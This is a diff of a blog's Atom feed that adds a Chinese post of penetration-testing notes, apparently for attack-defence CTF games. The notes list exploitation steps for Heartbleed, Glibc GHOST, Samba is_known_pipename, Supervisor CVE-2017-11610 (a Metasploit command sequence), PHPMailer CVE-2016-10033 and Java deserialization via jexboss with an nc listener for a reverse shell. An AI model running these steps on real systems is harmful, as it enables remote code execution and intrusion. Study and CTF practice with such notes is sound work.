@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-11-23T03:41:26.547Z</updated>
+  <updated>2017-11-25T10:43:25.212Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>渗透测试</title>
+    <link href="http://yoursite.com/2017/11/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    <id>http://yoursite.com/2017/11/25/渗透测试/</id>
+    <published>2017-11-25T10:38:05.000Z</published>
+    <updated>2017-11-25T10:43:25.212Z</updated>
+    
+    <content type="html"><![CDATA[<p>常见漏洞：（所有文件存在payloads文件里）</p><p>#①openssl心脏滴血（Openssl“心脏滴血”漏洞分析及利用：<a href="http://blog.csdn.net/xysoul/article/details/49894729）" target="_blank" rel="noopener">http://blog.csdn.net/xysoul/article/details/49894729）</a></p><p>#② Glibc幽灵漏洞 （利用模块modules/exploits/linux/smtp/exim_ghost_bof.rb;<a href="http://www.freebuf.com/vuls/61308.html）可否可行需要在自己的机器上测试，如果返回的数值是vulnerabl则表示漏洞可以使用用" target="_blank" rel="noopener">http://www.freebuf.com/vuls/61308.html）可否可行需要在自己的机器上测试，如果返回的数值是vulnerabl则表示漏洞可以使用用</a></p><p>#③sanmba3.50之后到4.6.4/4.5.10/4.4.14中间的所有版本<br>利用      exploit/linux/samba/is_known_pipename可以直接反弹shell</p><p>#④CVE-2017-11610 远程可执行漏洞<br>172.30.129.58  80      tcp    http  open   Gunicorn 19.7.1<br>172.30.129.58  9001  tcp    http  open   Medusa httpd 1.12 Supervisor process manager<br>msf &gt; use exploit/linux/http/supervisor_xmlrpc_exec msf exploit(supervisor_xmlrpc_exec) &gt; show targets …targets… msf exploit(supervisor_xmlrpc_exec) &gt; set TARGET <target-id> msf exploit(supervisor_xmlrpc_exec) &gt; show options …show and set options… msf exploit(supervisor_xmlrpc_exec) &gt; exploit</target-id></p><p>#⑤PHPMailer &lt; 5.2.18 远程命令执行漏洞环境 (CVE-2016-10033)<br>使用./exp.sh 127.0.0.1:8000就可以</p><p>#⑥java反序列化远程可执行漏洞<br>172.30.129.58  80    tcp    http  open   Apache Tomcat/Coyote JSP engine 1.1<br>使用nc命令监听攻击机的端口例如(nc -nvlp 9999)<br>使用jexboss<br>python jexboss.py -D –jboss -host <a href="http://172.30.129.58:8080/" target="_blank" rel="noopener">http://172.30.129.58:8080/</a><br>“admin-console”填写No<br>“JMXInvokerServlet”填写Yes<br>ip填写攻击机ip<br>端口填写攻击机nc监听端口（nc -nvlp 9999）</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;常见漏洞：（所有文件存在payloads文件里）&lt;/p&gt;
+&lt;p&gt;#①openssl心脏滴血（Openssl“心脏滴血”漏洞分析及利用：&lt;a href=&quot;http://blog.csdn.net/xysoul/article/details/49894729）&quot; target
+      
+    
+    </summary>
+    
+      <category term="AWD" scheme="http://yoursite.com/categories/AWD/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>AWD思路</title>
